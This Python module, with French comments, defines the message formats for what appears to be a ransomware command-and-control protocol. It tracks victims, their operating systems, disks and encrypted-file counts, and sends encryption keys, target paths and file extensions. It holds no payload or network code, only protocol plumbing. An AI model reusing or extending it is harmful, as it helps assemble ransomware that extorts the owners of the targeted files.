# Constante
DEBUG_MODE = False

# tous les dictionnaires LIST_VICTIM
LIST_VICTIM_REQ = {'LIST_REQ': None}
LIST_VICTIM_RESP = {'VICTIM': {}, 'HASH': {}, 'OS': {}, 'DISKS': {}, 'STATE': {}, 'NB_FILES': {}}
LIST_VICTIM_END = {'LIST_END': None}

# tous les dictionnaire d'HISTORY
HISTORY_REQ = {'HIST_REQ': ""}
HISTORY_RESP = {'HIST_RESP': {}, 'TIMESTAMP': {}, 'STATE': {}, 'NB_FILES': {}}
HISTORY_END = {'HIST_END': ""}

# dictionnaire de CHANGE_STATE
CHANGE_STATE = {'CHGSTATE': {}, 'STATE': {}}

# tous les dictionnaire de Initialize
INITIALIZE_REQ = {'INITIALIZE':  {}, 'OS':  {}, 'DISKS':  {}}
INITIALIZE_KEY = {'KEY_RESP':  {}, 'KEY':  {}, 'STATE':  {}}
INITIALIZE_RESP = {'CONFIGURE':  '', 'SETTING': {
    'DISKS':  '',
    'PATHS':  {},
    'FILE_EXT': {},
    'FREQ':  {},
    'KEY':  {},
    'STATE':  {}}
                   }

# liste de MESSAGE_TYPE
MESSAGE_TYPE = {
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'VICTIM': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END': 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
    'INITIALIZE': 'INITIALIZE_REQ',
    'KEY_RESP': 'INITIALIZE_KEY',
    'CONFIGURE': 'INITIALIZE_RESP'
}


def set_message(select_msg, params=None):
    if select_msg.upper() == 'LIST_VICTIMS_REQ':
        return LIST_VICTIM_REQ

    if select_msg.upper() == 'LIST_VICTIM_RESP':
        if len(params) != 6:
            return None
        LIST_VICTIM_RESP['VICTIM'] = params[0]
        LIST_VICTIM_RESP['HASH'] = params[1]
        LIST_VICTIM_RESP['OS'] = params[2]
        LIST_VICTIM_RESP['DISKS'] = params[3]
        LIST_VICTIM_RESP['STATE'] = params[4]
        LIST_VICTIM_RESP['NB_FILES'] = params[5]
        return LIST_VICTIM_RESP

    elif select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END

    elif select_msg.upper() == 'HISTORY_REQ':
        if len(params) != 1:
            return None
        HISTORY_REQ['HIST_REQ'] = params[0]
        return HISTORY_REQ

    elif select_msg.upper() == 'HISTORY_RESP':
        if len(params) != 4:
            return None
        HISTORY_RESP['HIST_RESP'] = params[0]
        HISTORY_RESP['TIMESTAMP'] = params[1]
        HISTORY_RESP['STATE'] = params[2]
        HISTORY_RESP['NB_FILES'] = params[3]
        return HISTORY_RESP

    elif select_msg.upper() == 'HISTORY_END':
        if len(params) != 1:
            return None
        HISTORY_END['HIST_END'] = params[0]
        return HISTORY_END

    elif select_msg.upper() == 'CHANGE_STATE':
        if len(params) != 2:
            return None
        CHANGE_STATE['CHGSTATE'] = params[0]
        CHANGE_STATE['STATE'] = params[1]
        return CHANGE_STATE

    elif select_msg.upper() == 'INITIALIZE_REQ':
        if len(params) != 3:
            return None
        INITIALIZE_REQ['INITIALIZE'] = params[0]
        INITIALIZE_REQ['OS'] = params[1]
        INITIALIZE_REQ['DISKS'] = params[2]
        return INITIALIZE_REQ

    elif select_msg.upper() == 'INITIALIZE_KEY':
        if len(params) != 3:
            return None
        INITIALIZE_KEY['KEY_RESP'] = params[0]
        INITIALIZE_KEY['KEY'] = params[1]
        INITIALIZE_KEY['STATE'] = params[2]
        return INITIALIZE_KEY

    elif select_msg.upper() == 'INITIALIZE_RESP':
        if len(params) != 7:
            return None

        INITIALIZE_RESP['CONFIGURE'] = params[0]
        INITIALIZE_RESP['SETTING']['DISKS'] = params[1]
        INITIALIZE_RESP['SETTING']['PATHS'] = params[2]
        INITIALIZE_RESP['SETTING']['FILE_EXT'] = params[3]
        INITIALIZE_RESP['SETTING']['FREQ'] = params[4]
        INITIALIZE_RESP['SETTING']['KEY'] = params[5]
        INITIALIZE_RESP['SETTING']['STATE'] = params[6]
        return INITIALIZE_RESP

def get_message_type(message):
    first_key = list(message.keys())[0]
    # if DEBUG_MODE:
    #    print("get_message_type()\n MESSAGE TYPE:", MESSAGE_TYPE[first_key])
    return MESSAGE_TYPE[first_key]


